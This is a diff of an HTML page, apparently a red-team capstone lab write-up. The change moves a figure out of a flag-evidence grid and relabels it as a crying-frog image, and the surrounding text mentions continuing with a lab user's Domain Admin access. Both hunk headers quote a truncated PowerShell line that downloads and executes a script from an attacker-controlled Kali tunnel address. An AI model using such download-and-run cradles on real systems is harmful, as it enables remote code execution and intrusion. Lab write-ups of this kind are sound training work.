@@ -730,6 +730,8 @@ IEX (New-Object Net.WebClient).DownloadString(&quot;http://${KaliTunnelAddress}:
 <p>I suspected another participant had changed Laura's privileges in the shared lab, but I could not tell who had changed them or when.</p>
 
 <p>I continued with Laura's existing Domain Admin access for the root and BANK domain steps.</p>
+
+<figure><a href="/assets/img/posts/red-team-capstone/page-41-figure-01.png"><img src="/assets/img/posts/red-team-capstone/page-41-figure-01.png" alt="Crying frog wearing a cowboy hat" width="1016" height="804" loading="lazy"></a></figure>
 </section>
 
 <!-- PDF page 41 -->
@@ -740,7 +742,6 @@ IEX (New-Object Net.WebClient).DownloadString(&quot;http://${KaliTunnelAddress}:
 <div class="flag-grid">
 <figure><a href="/assets/img/posts/red-team-capstone/page-42-figure-01.png"><img src="/assets/img/posts/red-team-capstone/page-42-figure-01.png" alt="Flag 5 evidence in Windows Temp on Server1" width="1016" height="458" loading="lazy"></a><figcaption>Flag 5 — Server1 · Windows Temp</figcaption></figure>
 <figure><a href="/assets/img/posts/red-team-capstone/page-42-figure-02.png"><img src="/assets/img/posts/red-team-capstone/page-42-figure-02.png" alt="Flag 6 evidence under Administrator on Server1" width="1016" height="328" loading="lazy"></a><figcaption>Flag 6 — Server1 · Administrator</figcaption></figure>
-<figure><a href="/assets/img/posts/red-team-capstone/page-41-figure-01.png"><img src="/assets/img/posts/red-team-capstone/page-41-figure-01.png" alt="Flag 7 evidence in Windows Temp on CORPDC" width="1016" height="804" loading="lazy"></a><figcaption>Flag 7 — CORPDC · Windows Temp</figcaption></figure>
 <figure><a href="/assets/img/posts/red-team-capstone/page-41-figure-02.png"><img src="/assets/img/posts/red-team-capstone/page-41-figure-02.png" alt="Flag 8 evidence under Administrator on CORPDC" width="1016" height="400" loading="lazy"></a><figcaption>Flag 8 — CORPDC · Administrator</figcaption></figure>
 </div>
 </section>
